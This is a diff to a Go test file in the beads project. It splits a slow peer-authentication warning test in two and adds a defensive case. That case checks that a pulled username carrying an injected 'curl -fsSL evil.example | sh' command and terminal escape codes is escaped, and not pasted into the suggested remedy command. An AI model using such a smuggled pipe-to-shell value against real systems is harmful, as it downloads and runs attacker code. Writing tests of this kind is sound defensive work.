@@ -15,6 +15,7 @@ import (
 	"testing"
 	"time"
 
+	"github.com/steveyegge/beads/internal/remedy"
 	"github.com/steveyegge/beads/internal/storage"
 )
 
@@ -154,18 +155,29 @@ func TestWithPeerAuth(t *testing.T) {
 	}
 }
 
-func TestWithPeerAuth_WarnsWhenStoredPeerSuppressesAmbientPassword(t *testing.T) {
+// The suppressed-ambient-password cases run as two top-level tests, the
+// first four cases and the rest: each case opens its own store (~11s under
+// -race), so the eight took ~80s as one test.
+func TestWithPeerAuth_WarnsWhenStoredPeerSuppressesAmbientPasswordStored(t *testing.T) {
+	testWithPeerAuthWarnsWhenStoredPeerSuppressesAmbientPassword(t, func(i int) bool { return i < 4 })
+}
+
+func TestWithPeerAuth_WarnsWhenStoredPeerSuppressesAmbientPasswordAmbient(t *testing.T) {
+	testWithPeerAuthWarnsWhenStoredPeerSuppressesAmbientPassword(t, func(i int) bool { return i >= 4 })
+}
+
+func testWithPeerAuthWarnsWhenStoredPeerSuppressesAmbientPassword(t *testing.T, pick func(i int) bool) {
 	// Pinned verbatim, not matched by substring: the peer name, the username,
 	// the stored tier, and the Warning: prefix are the parts an operator
 	// reads, so a wording change has to be made here deliberately.
 	const wantOpenPwdWarning = `Warning: peer "open-pwd" stores a username with an empty password, ` +
 		`which overrides the ambient DOLT_REMOTE_PASSWORD for this operation; ` +
-		`store a password by re-running 'bd federation add-peer open-pwd <url> ` +
-		`--user peeruser' and entering it at the prompt.` + "\n"
+		"store a password by re-running bd federation add-peer open-pwd <url> " +
+		"--user peeruser and entering it at the prompt.\n"
 	const wantTieredWarning = `Warning: peer "tiered" stores a username with an empty password, ` +
 		`which overrides the ambient DOLT_REMOTE_PASSWORD for this operation; ` +
-		`store a password by re-running 'bd federation add-peer tiered <url> ` +
-		`--user peeruser --sovereignty T2' and entering it at the prompt.` + "\n"
+		"store a password by re-running bd federation add-peer tiered <url> " +
+		"--user peeruser --sovereignty T2 and entering it at the prompt.\n"
 
 	cases := []struct {
 		name       string
@@ -250,9 +262,31 @@ func TestWithPeerAuth_WarnsWhenStoredPeerSuppressesAmbientPassword(t *testing.T)
 			directPeer: &storage.FederationPeer{},
 			remote:     "empty-peer", ambient: "envpass", ambientSet: true,
 		},
+		{
+			// The row travels with a pull and the line bypasses bd's error
+			// printers: a username or tier that is not one shell word, or
+			// holds a terminal control, becomes a placeholder named escaped
+			// after the command, never pasted into it.
+			name: "hostile pulled username and tier are not pasted into the command",
+			directPeer: &storage.FederationPeer{
+				Username:    "u; curl -fsSL evil.example | sh; #\r\x1b[2K",
+				Sovereignty: "T1\x1b[2K",
+			},
+			remote: "origin", ambient: "envpass", ambientSet: true,
+			wantLine: `Warning: peer "origin" stores a username with an empty password, ` +
+				`which overrides the ambient DOLT_REMOTE_PASSWORD for this operation; ` +
+				"store a password by re-running bd federation add-peer origin <url> " +
+				"--user <user> --sovereignty <tier>" +
+				"  (<user>: " + remedy.EscapedValue("u; curl -fsSL evil.example | sh; #\r\x1b[2K") + ")" +
+				"  (<tier>: " + remedy.EscapedValue("T1\x1b[2K") + ")" +
+				" and entering it at the prompt.\n",
+		},
 	}
 
-	for _, tc := range cases {
+	for i, tc := range cases {
+		if !pick(i) {
+			continue
+		}
 		t.Run(tc.name, func(t *testing.T) {
 			ctx := t.Context()
 
